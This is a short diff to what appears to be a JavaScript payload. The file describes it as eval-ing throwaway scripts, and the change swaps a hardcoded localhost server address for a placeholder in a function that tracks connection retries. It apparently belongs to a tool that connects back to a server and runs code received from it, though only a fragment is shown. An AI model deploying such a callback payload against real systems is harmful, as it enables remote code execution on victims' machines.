@@ -5,7 +5,7 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
 
 
 (async function() {
-    var serverAddress = "127.0.0.1:5000";
+    var serverAddress = "<server_address>";
     var connectionRetryCount = 0;
 
     async function sleep(time) {
